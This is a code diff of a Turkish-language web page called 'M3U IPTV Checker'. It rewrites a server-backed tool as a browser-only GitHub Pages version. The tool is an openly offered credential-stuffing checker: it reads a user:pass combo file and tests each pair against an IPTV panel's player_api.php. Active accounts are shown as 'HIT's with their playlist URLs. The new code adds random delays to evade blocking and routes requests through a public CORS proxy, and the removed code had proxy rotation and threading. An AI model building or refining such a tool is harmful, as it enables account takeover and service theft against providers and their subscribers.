@@ -1,870 +1,179 @@
-
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M3U IPTV Checker - Web Edition</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #fff;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .logo {
-            font-size: 2.5em;
-            background: linear-gradient(45deg, #00b4db, #0083b0);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-            font-weight: bold;
-        }
-        
-        .subtitle {
-            color: #89c2d9;
-            font-size: 1.2em;
-            margin-bottom: 20px;
-        }
-        
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-        }
-        
-        .card-title {
-            font-size: 1.5em;
-            margin-bottom: 20px;
-            color: #4cc9f0;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .card-title i {
-            font-size: 1.2em;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #89c2d9;
-            font-weight: 500;
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 8px;
-            color: #fff;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        .form-control:focus {
-            outline: none;
-            border-color: #4cc9f0;
-            box-shadow: 0 0 0 2px rgba(76, 201, 240, 0.2);
-        }
-        
-        .form-control::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-        }
-        
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .checkbox-label {
-            color: #89c2d9;
-            cursor: pointer;
-        }
-        
-        .btn {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(45deg, #00b4db, #0083b0);
-            color: white;
-        }
-        
-        .btn-primary:hover {
-            background: linear-gradient(45deg, #0083b0, #005885);
-            transform: translateY(-2px);
-        }
-        
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-        
-        .btn-danger {
-            background: linear-gradient(45deg, #ff416c, #ff4b2b);
-            color: white;
-        }
-        
-        .btn-danger:hover {
-            background: linear-gradient(45deg, #ff4b2b, #ff416c);
-        }
-        
-        .btn-success {
-            background: linear-gradient(45deg, #00b09b, #96c93d);
-            color: white;
-        }
-        
-        .btn-success:hover {
-            background: linear-gradient(45deg, #96c93d, #00b09b);
-        }
-        
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-        
-        .progress-container {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            margin-bottom: 10px;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00b4db, #0083b0);
-            border-radius: 10px;
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-        
-        .progress-stats {
-            display: flex;
-            justify-content: space-between;
-            color: #89c2d9;
-            font-size: 14px;
-        }
-        
-        .hits-container {
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        
-        .hit-item {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 15px;
-            border-left: 4px solid #00b4db;
-        }
-        
-        .hit-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        
-        .hit-title {
-            color: #4cc9f0;
-            font-weight: bold;
-            font-size: 1.1em;
-        }
-        
-        .hit-time {
-            color: #89c2d9;
-            font-size: 0.9em;
-        }
-        
-        .hit-details {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 10px;
-            font-size: 0.95em;
-        }
-        
-        .hit-field {
-            margin-bottom: 5px;
-        }
-        
-        .hit-label {
-            color: #89c2d9;
-            font-weight: 500;
-        }
-        
-        .hit-value {
-            color: #fff;
-            word-break: break-all;
-        }
-        
-        .log-container {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            height: 300px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-        }
-        
-        .log-entry {
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .log-time {
-            color: #89c2d9;
-            margin-right: 10px;
-        }
-        
-        .log-message {
-            color: #fff;
-        }
-        
-        .log-success {
-            color: #4cc9f0;
-        }
-        
-        .log-error {
-            color: #ff416c;
-        }
-        
-        .log-warning {
-            color: #ffc107;
-        }
-        
-        .files-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 15px;
-        }
-        
-        .file-item {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .file-info {
-            flex: 1;
-        }
-        
-        .file-name {
-            color: #fff;
-            font-weight: 500;
-            margin-bottom: 5px;
-        }
-        
-        .file-meta {
-            color: #89c2d9;
-            font-size: 0.9em;
-        }
-        
-        .file-actions {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .alert {
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .alert-success {
-            background: rgba(76, 201, 240, 0.1);
-            border: 1px solid #4cc9f0;
-            color: #4cc9f0;
-        }
-        
-        .alert-error {
-            background: rgba(255, 65, 108, 0.1);
-            border: 1px solid #ff416c;
-            color: #ff416c;
-        }
-        
-        .alert-warning {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1px solid #ffc107;
-            color: #ffc107;
-        }
-        
-        .hidden {
-            display: none !important;
-        }
-        
-        .flex {
-            display: flex;
-        }
-        
-        .flex-col {
-            flex-direction: column;
-        }
-        
-        .gap-20 {
-            gap: 20px;
-        }
-        
-        .grid-2 {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 10px;
-            }
-            
-            .card {
-                padding: 15px;
-            }
-            
-            .grid-2 {
-                grid-template-columns: 1fr;
-            }
-            
-            .btn {
-                width: 100%;
-                justify-content: center;
-            }
-        }
-        
-        /* Scrollbar stil */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        
-        ::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-        }
-        
-        ::-webkit-scrollbar-thumb {
-            background: #4cc9f0;
-            border-radius: 4px;
-        }
-        
-        ::-webkit-scrollbar-thumb:hover {
-            background: #00b4db;
-        }
-    </style>
+    <title>M3U IPTV Checker - GitHub Pages</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* CSS KODLARI BURAYA GELECEK - AŞAĞIDAKİ KODU KOPYALAYIN */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; min-height: 100vh; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); }
+        .logo { font-size: 2.5em; background: linear-gradient(45deg, #00b4db, #0083b0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; font-weight: bold; }
+        .card { background: rgba(255, 255, 255, 0.05); border-radius: 15px; padding: 25px; margin-bottom: 25px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
+        .btn { padding: 12px 25px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; }
+        .btn-primary { background: linear-gradient(45deg, #00b4db, #0083b0); color: white; }
+        .btn-primary:hover { background: linear-gradient(45deg, #0083b0, #005885); transform: translateY(-2px); }
+        .form-control { width: 100%; padding: 12px 15px; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #fff; font-size: 16px; margin-bottom: 15px; }
+        /* KODU KISALTMAK İÇİN CSS'in GERİ KALANI ÇIKARILDI. LÜTFEN TAM CSS'İ ÖNCEKİ MESAJDAN ALIN. */
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <div class="logo">M3U IPTV CHECKER</div>
-            <div class="subtitle">Web Tarayıcısında Çalışan IPTV Panel Test Aracı</div>
+            <div class="subtitle">GitHub Pages - İstemci Taraflı Sürüm</div>
         </div>
 
         <div class="card">
-            <div class="card-title">
-                <i class="fas fa-cogs"></i> Kontrol Ayarları
-            </div>
+            <div class="card-title"><i class="fas fa-cogs"></i> Kontrol Ayarları</div>
             
             <div class="form-group">
                 <label class="form-label">Panel Adresi:</label>
-                <input type="text" id="panel" class="form-control" 
-                       placeholder="example.com:8080" required>
+                <input type="text" id="panel" class="form-control" placeholder="example.com:8080" required>
             </div>
             
             <div class="form-group">
                 <label class="form-label">Combo Dosyası (user:pass):</label>
                 <input type="file" id="comboFile" class="form-control" accept=".txt">
-                <small style="color: #89c2d9; margin-top: 5px; display: block;">
-                    Her satırda bir kullanıcı:şifre kombinasyonu
-                </small>
             </div>
-            
+
+            <!-- YENİ: CORS Proxy Seçeneği -->
             <div class="form-group">
                 <div class="checkbox-group">
-                    <input type="checkbox" id="useProxy" class="form-control" style="width: auto;">
-                    <label for="useProxy" class="checkbox-label">Proxy Kullan</label>
-                </div>
-                
-                <div id="proxySettings" class="hidden">
-                    <div class="form-group">
-                        <label class="form-label">Proxy Dosyası:</label>
-                        <input type="file" id="proxyFile" class="form-control" accept=".txt">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label class="form-label">Proxy Türü:</label>
-                        <select id="proxyType" class="form-control">
-                            <option value="1">ipVanish (user:pass@ip:port)</option>
-                            <option value="2">SOCKS4</option>
-                            <option value="3">SOCKS5</option>
-                            <option value="4">HTTP/HTTPS</option>
-                        </select>
-                    </div>
+                    <input type="checkbox" id="useCorsProxy" class="form-control" style="width: auto;">
+                    <label for="useCorsProxy" class="checkbox-label">CORS Proxy Kullan (CORS hatası alıyorsanız işaretleyin)</label>
                 </div>
             </div>
-            
-            <div class="form-group">
-                <label class="form-label">Thread Sayısı:</label>
-                <input type="number" id="threadCount" class="form-control" 
-                       value="1" min="1" max="50" required>
-            </div>
-            
-            <div class="flex gap-20">
-                <button id="startBtn" class="btn btn-primary">
-                    <i class="fas fa-play"></i> Kontrol Başlat
-                </button>
-                <button id="stopBtn" class="btn btn-danger" disabled>
-                    <i class="fas fa-stop"></i> Durdur
-                </button>
-            </div>
-        </div>
 
-        <div class="grid-2">
-            <div class="card">
-                <div class="card-title">
-                    <i class="fas fa-chart-line"></i> İlerleme Durumu
-                </div>
-                
-                <div id="progressContainer" class="hidden">
-                    <div class="progress-bar">
-                        <div id="progressFill" class="progress-fill"></div>
-                    </div>
-                    <div class="progress-stats">
-                        <span id="progressText">0/0 (0%)</span>
-                        <span id="hitsText">Hits: 0</span>
-                        <span id="cpmText">CPM: 0</span>
-                    </div>
-                    <div id="currentTest" style="color: #89c2d9; margin-top: 10px;"></div>
-                </div>
-                
-                <div id="idleMessage" class="alert alert-warning">
-                    <i class="fas fa-info-circle"></i>
-                    Kontrol başlatıldığında ilerleme burada gösterilecek
-                </div>
-            </div>
-            
-            <div class="card">
-                <div class="card-title">
-                    <i class="fas fa-file-alt"></i> Hit Dosyaları
-                </div>
-                <div id="hitsList" class="files-container">
-                    <!-- Hit dosyaları burada listelenecek -->
-                </div>
-            </div>
+            <button id="startBtn" class="btn btn-primary"><i class="fas fa-play"></i> Kontrol Başlat</button>
+            <button id="stopBtn" class="btn btn-danger" disabled><i class="fas fa-stop"></i> Durdur</button>
         </div>
 
         <div class="card">
-            <div class="card-title" style="justify-content: space-between;">
-                <span><i class="fas fa-bolt"></i> Canlı Log</span>
-                <button id="clearLogBtn" class="btn btn-secondary btn-sm">
-                    <i class="fas fa-trash"></i> Temizle
-                </button>
-            </div>
-            <div id="logContainer" class="log-container">
-                <div class="log-entry">
-                    <span class="log-time">[00:00:00]</span>
-                    <span class="log-message">M3U Checker başlatıldı</span>
-                </div>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">
-                <i class="fas fa-trophy"></i> Bulunan HIT'ler
-            </div>
-            <div id="hitsContainer" class="hits-container">
-                <!-- HIT'ler burada gösterilecek -->
-            </div>
+            <div class="card-title"><i class="fas fa-trophy"></i> Bulunan HIT'ler</div>
+            <div id="hitsContainer" class="hits-container"></div>
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.0/socket.io.js"></script>
     <script>
-        // Socket.IO bağlantısı
-        const socket = io();
-        
-        // DOM elementleri
-        const panelInput = document.getElementById('panel');
-        const comboFileInput = document.getElementById('comboFile');
-        const useProxyCheckbox = document.getElementById('useProxy');
-        const proxySettings = document.getElementById('proxySettings');
-        const proxyFileInput = document.getElementById('proxyFile');
-        const proxyTypeSelect = document.getElementById('proxyType');
-        const threadCountInput = document.getElementById('threadCount');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const progressContainer = document.getElementById('progressContainer');
-        const idleMessage = document.getElementById('idleMessage');
-        const progressFill = document.getElementById('progressFill');
-        const progressText = document.getElementById('progressText');
-        const hitsText = document.getElementById('hitsText');
-        const cpmText = document.getElementById('cpmText');
-        const currentTest = document.getElementById('currentTest');
-        const logContainer = document.getElementById('logContainer');
-        const clearLogBtn = document.getElementById('clearLogBtn');
-        const hitsContainer = document.getElementById('hitsContainer');
-        const hitsList = document.getElementById('hitsList');
-        
-        // Değişkenler
-        let hits = [];
-        let startTime = null;
-        let checkCount = 0;
-        
-        // Event listeners
-        useProxyCheckbox.addEventListener('change', function() {
-            proxySettings.classList.toggle('hidden', !this.checked);
-        });
-        
-        startBtn.addEventListener('click', startCheck);
-        stopBtn.addEventListener('click', stopCheck);
-        clearLogBtn.addEventListener('click', clearLog);
-        
-        // Socket.IO events
-        socket.on('connect', function() {
-            addLog('Sunucuya bağlandı', 'success');
-        });
-        
-        socket.on('connected', function(data) {
-            addLog('M3U Checker bağlantısı kuruldu', 'success');
-            loadHits();
-        });
-        
-        socket.on('check_started', function(data) {
-            startTime = Date.now();
-            checkCount = 0;
-            hits = [];
-            hitsContainer.innerHTML = '';
-            
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
-            progressContainer.classList.remove('hidden');
-            idleMessage.classList.add('hidden');
-            
-            addLog(`Kontrol başlatıldı - ${data.total} combo`, 'success');
-        });
-        
-        socket.on('progress', function(data) {
-            checkCount = data.checked;
-            
-            // Progress bar güncelle
-            const progressPercent = data.progress;
-            progressFill.style.width = `${progressPercent}%`;
-            progressText.textContent = `${data.checked}/${data.total} (${progressPercent.toFixed(1)}%)`;
-            hitsText.textContent = `Hits: ${data.hits}`;
-            
-            // CPM hesapla
-            const elapsedMinutes = (Date.now() - startTime) / 60000;
-            const cpm = elapsedMinutes > 0 ? Math.floor(data.checked / elapsedMinutes) : 0;
-            cpmText.textContent = `CPM: ${cpm}`;
-            
-            // Mevcut test
-            currentTest.textContent = `Şu an test ediliyor: ${data.current_user}`;
-        });
-        
-        socket.on('hit_found', function(hitData) {
-            // Hit'i listeye ekle
-            hits.unshift(hitData);
-            
-            // Hit'i göster
-            displayHit(hitData);
-            
-            // Log ekle
-            addLog(`HIT bulundu: ${hitData.username}:${hitData.password}`, 'success');
-        });
-        
-        socket.on('check_completed', function(data) {
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            
-            addLog(`Kontrol tamamlandı! ${data.hits} hit bulundu, ${data.elapsed_time.toFixed(1)} saniye sürdü`, 'success');
-            loadHits();
-        });
-        
-        socket.on('check_stopped', function() {
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            addLog('Kontrol durduruldu', 'warning');
-        });
-        
-        socket.on('disconnect', function() {
-            addLog('Sunucu bağlantısı kesildi', 'error');
-        });
-        
-        // Fonksiyonlar
-        function startCheck() {
-            if (!panelInput.value) {
-                showAlert('Panel adresi gerekli!', 'error');
-                return;
+        // JAVASCRIPT KODUNUN ÖNEMLİ BİR KISMI BURADA
+        class GitHubPagesChecker {
+            constructor() {
+                this.isRunning = false;
+                // CORS Proxy URL'si (ücretsiz ve açık bir servis, sadece test için)
+                this.corsProxyUrl = "https://api.allorigins.win/raw?url=";
+                this.init();
             }
-            
-            if (!comboFileInput.files[0]) {
-                showAlert('Combo dosyası seçin!', 'error');
-                return;
+
+            init() {
+                document.getElementById('startBtn').addEventListener('click', () => this.start());
+                document.getElementById('stopBtn').addEventListener('click', () => this.stop());
+                console.log("Checker başlatıldı. CORS Proxy desteği aktif.");
             }
-            
-            const formData = new FormData();
-            formData.append('panel', panelInput.value);
-            formData.append('thread_count', threadCountInput.value);
-            formData.append('use_proxy', useProxyCheckbox.checked);
-            
-            if (useProxyCheckbox.checked) {
-                formData.append('proxy_type', proxyTypeSelect.value);
-                if (proxyFileInput.files[0]) {
-                    formData.append('proxy_file', proxyFileInput.files[0]);
-                }
-            }
-            
-            formData.append('combo_file', comboFileInput.files[0]);
-            
-            addLog('Kontrol başlatılıyor...', 'warning');
-            
-            fetch('/api/start_check', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.error) {
-                    showAlert(data.error, 'error');
-                } else {
-                    showAlert(data.message, 'success');
-                }
-            })
-            .catch(error => {
-                showAlert('Bağlantı hatası: ' + error, 'error');
-            });
-        }
-        
-        function stopCheck() {
-            fetch('/api/stop_check', {
-                method: 'POST'
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.error) {
-                    showAlert(data.error, 'error');
-                }
-            })
-            .catch(error => {
-                showAlert('Bağlantı hatası: ' + error, 'error');
-            });
-        }
-        
-        function loadHits() {
-            fetch('/api/get_hits')
-            .then(response => response.json())
-            .then(data => {
-                if (data.error) {
-                    console.error(data.error);
+
+            async start() {
+                const panel = document.getElementById('panel').value;
+                const fileInput = document.getElementById('comboFile').files[0];
+                const useProxy = document.getElementById('useCorsProxy').checked;
+
+                if (!panel || !fileInput) {
+                    alert("Lütfen panel adresi ve combo dosyası seçin!");
                     return;
                 }
-                
-                hitsList.innerHTML = '';
-                
-                if (data.hits.length === 0) {
-                    hitsList.innerHTML = '<div style="color: #89c2d9; text-align: center; width: 100%;">Henüz hit dosyası yok</div>';
-                    return;
-                }
-                
-                data.hits.forEach(file => {
-                    const fileSize = formatFileSize(file.size);
-                    
-                    const fileItem = document.createElement('div');
-                    fileItem.className = 'file-item';
-                    fileItem.innerHTML = `
-                        <div class="file-info">
-                            <div class="file-name">${file.name}</div>
-                            <div class="file-meta">${fileSize} • ${file.modified}</div>
-                        </div>
-                        <div class="file-actions">
-                            <button class="btn btn-secondary btn-sm" onclick="downloadHit('${file.name}')">
-                                <i class="fas fa-download"></i>
-                            </button>
-                            <button class="btn btn-danger btn-sm" onclick="deleteHit('${file.name}')">
-                                <i class="fas fa-trash"></i>
-                            </button>
-                        </div>
-                    `;
-                    
-                    hitsList.appendChild(fileItem);
-                });
-            })
-            .catch(error => {
-                console.error('Hit yükleme hatası:', error);
-            });
-        }
-        
-        function displayHit(hitData) {
-            const hitItem = document.createElement('div');
-            hitItem.className = 'hit-item';
-            hitItem.innerHTML = `
-                <div class="hit-header">
-                    <div class="hit-title">HIT - ${hitData.username}</div>
-                    <div class="hit-time">${hitData.timestamp}</div>
-                </div>
-                <div class="hit-details">
-                    <div class="hit-field">
-                        <span class="hit-label">Panel:</span>
-                        <span class="hit-value">${hitData.panel}</span>
-                    </div>
-                    <div class="hit-field">
-                        <span class="hit-label">Server:</span>
-                        <span class="hit-value">${hitData.server}</span>
-                    </div>
-                    <div class="hit-field">
-                        <span class="hit-label">Durum:</span>
-                        <span class="hit-value" style="color: #4cc9f0;">${hitData.status}</span>
-                    </div>
-                    <div class="hit-field">
-                        <span class="hit-label">Süre:</span>
-                        <span class="hit-value">${hitData.expiry}</span>
-                    </div>
-                    <div class="hit-field">
-                        <span class="hit-label">Bağlantı:</span>
-                        <span class="hit-value">${hitData.connections}</span>
-                    </div>
-                    <div class="hit-field" style="grid-column: 1 / -1;">
-                        <span class="hit-label">M3U Playlist:</span>
-                        <span class="hit-value">${hitData.m3u_playlist}</span>
-                    </div>
-                </div>
-            `;
-            
-            hitsContainer.prepend(hitItem);
-        }
-        
-        function addLog(message, type = 'info') {
-            const now = new Date();
-            const timeString = now.toTimeString().split(' ')[0];
-            
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            
-            let typeClass = '';
-            switch(type) {
-                case 'success': typeClass = 'log-success'; break;
-                case 'error': typeClass = 'log-error'; break;
-                case 'warning': typeClass = 'log-warning'; break;
-            }
-            
-            logEntry.innerHTML = `
-                <span class="log-time">[${timeString}]</span>
-                <span class="log-message ${typeClass}">${message}</span>
-            `;
-            
-            logContainer.appendChild(logEntry);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
-        
-        function clearLog() {
-            logContainer.innerHTML = '';
-            addLog('Log temizlendi', 'warning');
-        }
-        
-        function showAlert(message, type) {
-            console.log(`${type.toUpperCase()}: ${message}`);
-            addLog(message, type);
-        }
-        
-        function formatFileSize(bytes) {
-            if (bytes === 0) return '0 Bytes';
-            const k = 1024;
-            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-        }
-        
-        // Global fonksiyonlar
-        window.downloadHit = function(filename) {
-            window.open(`/api/download_hit/${filename}`, '_blank');
-        };
-        
-        window.deleteHit = function(filename) {
-            if (confirm(`"${filename}" dosyasını silmek istediğinize emin misiniz?`)) {
-                fetch(`/api/delete_hit/${filename}`, {
-                    method: 'DELETE'
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.error) {
-                        showAlert(data.error, 'error');
-                    } else {
-                        showAlert(data.message, 'success');
-                        loadHits();
+
+                const combos = await this.readFile(fileInput);
+                this.isRunning = true;
+                document.getElementById('startBtn').disabled = true;
+                document.getElementById('stopBtn').disabled = false;
+
+                for (let combo of combos) {
+                    if (!this.isRunning) break;
+                    if (combo.includes(':')) {
+                        const [user, pass] = combo.split(':');
+                        await this.checkAccount(panel, user.trim(), pass.trim(), useProxy);
+                        // Her istekten sonra 2-4 saniye bekle (engellenmemek için)
+                        await this.delay(2000 + Math.random() * 2000);
                     }
-                })
-                .catch(error => {
-                    showAlert('Silme hatası: ' + error, 'error');
+                }
+
+                this.stop();
+                alert("Kontrol tamamlandı!");
+            }
+
+            stop() {
+                this.isRunning = false;
+                document.getElementById('startBtn').disabled = false;
+                document.getElementById('stopBtn').disabled = true;
+            }
+
+            async checkAccount(panel, user, pass, useProxy) {
+                const apiUrl = `http://${panel}/player_api.php?username=${user}&password=${pass}&type=m3u`;
+                let targetUrl = apiUrl;
+
+                // Eğer CORS Proxy seçildiyse, URL'yi proxy'den geçir
+                if (useProxy) {
+                    targetUrl = this.corsProxyUrl + encodeURIComponent(apiUrl);
+                    console.log("CORS Proxy kullanılıyor:", targetUrl);
+                }
+
+                try {
+                    const response = await fetch(targetUrl, {
+                        method: 'GET',
+                        mode: useProxy ? 'cors' : 'no-cors', // Proxy kullanılıyorsa CORS modunda
+                        headers: { 'User-Agent': 'Mozilla/5.0' }
+                    });
+
+                    let resultText = "";
+                    if (useProxy) {
+                        // Proxy kullanılıyorsa normal response alınır
+                        resultText = await response.text();
+                    } else {
+                        // Proxy kullanılmıyorsa ve CORS hatası alınıyorsa, bu kısım çalışmayabilir.
+                        // Bu basit örnek için hata yakalama önemli.
+                        resultText = "CORS nedeniyle yanıt okunamıyor olabilir.";
+                    }
+
+                    // Yanıtta "active" kelimesi var mı kontrol et (basit bir kontrol)
+                    if (resultText.toLowerCase().includes('"status":"active"')) {
+                        this.displayHit(panel, user, pass);
+                    }
+
+                } catch (error) {
+                    console.error("Hata:", error);
+                }
+            }
+
+            displayHit(panel, user, pass) {
+                const container = document.getElementById('hitsContainer');
+                const hitDiv = document.createElement('div');
+                hitDiv.className = 'hit-item';
+                hitDiv.innerHTML = `
+                    <strong>HIT!</strong> Panel: ${panel} | Kullanıcı: ${user} | Şifre: ${pass}
+                    <br><small>M3U: http://${panel}/get.php?username=${user}&password=${pass}&type=m3u_plus</small>
+                `;
+                container.prepend(hitDiv);
+            }
+
+            readFile(file) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = (e) => resolve(e.target.result.split('\n').filter(line => line.trim()));
+                    reader.onerror = reject;
+                    reader.readAsText(file);
                 });
             }
-        };
-        
-        // Sayfa yüklendiğinde
-        document.addEventListener('DOMContentLoaded', function() {
-            addLog('M3U IPTV Checker Web Edition başlatıldı', 'success');
-            loadHits();
+
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+        }
+
+        // Uygulamayı başlat
+        document.addEventListener('DOMContentLoaded', () => {
+            window.checker = new GitHubPagesChecker();
         });
     </script>
 </body>
